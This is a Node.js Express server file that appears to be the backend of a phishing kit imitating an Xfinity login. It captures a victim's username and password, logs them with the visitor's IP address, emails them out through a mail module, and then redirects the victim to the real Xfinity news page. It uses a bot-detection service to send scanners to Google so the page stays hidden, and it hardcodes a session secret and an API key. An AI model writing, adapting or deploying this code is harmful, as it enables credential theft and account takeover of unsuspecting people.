const express = require('express');
const session = require('express-session');
const path = require('path');
const cors = require('cors');
const axios = require('axios');
const sendMail = require('./mail');
const beautify = require('js-beautify').html;
const ejs = require('ejs');
const DataDome = require('@datadome/node-module');

const app = express();
const PORT = 8080;

app.set('view engine', 'ejs');
app.use(express.static('views'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors());

app.use(session({
  secret: 'thisispersonel',
  resave: false,
  saveUninitialized: true,
}));

app.set('trust proxy', true); // To trust the X-Forwarded-For header

app.use((req, res, next) => {
  const userIP = req.ip;
  console.log('User IP:', userIP);
  next();
});

const datadomeClient = new DataDome('AOhAWR2USOQ39Cj', 'api.datadome.co')
  .on('blocked', (req, res) => {
    console.log('request blocked');
    res.redirect('https://www.google.com');
  })
  .on('valid', (req, res) => {
    console.log('request allowed');
    ejs.renderFile(path.join(__dirname, 'views', 'index.ejs'), {}, (err, str) => {
      if (err) {
        console.error('EJS render error:', err);
        res.status(500).json({ message: 'Internal error', err });
      } else {
        const obfuscatedHTML = beautify(str, { /* obfuscation options */ });
        res.send(obfuscatedHTML);
      }
    });
  });

app.post('/loginPage', (req, res) => {
  const userInput = req.body.user;
  req.session.userInput = userInput;
  res.redirect('/loginPage');
});

app.get('/loginPage', async (req, res) => {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    const visitorIP = response.data.ip;

    req.session.visitorIP = visitorIP;
    req.session.userInput = req.session.userInput || null;

    const userInput = req.session.userInput;
    const sessionVisitorIP = req.session.visitorIP;

    res.render('loginPage.ejs', { visitorIP: sessionVisitorIP, userInput });
  } catch (error) {
    console.error('Error getting IP:', error);
    res.status(500).send('Error getting IP');
  }
});

app.post('/email', (req, res) => {
  const { passwd } = req.body;
  const { visitorIP, userInput } = req.session;
  console.log (passwd, visitorIP, userInput)

  sendMail(userInput, passwd, visitorIP, (err) => {
    if (err) {
      res.status(500).json({ message: 'internal error', err });
    } else {
      res.redirect('https://www.xfinity.com/hub/news');
    }
  });
});

app.get('/', (req, res) => {
  datadomeClient.auth(req, res);
});

app.listen(PORT, () => console.log('Server running on port', PORT));
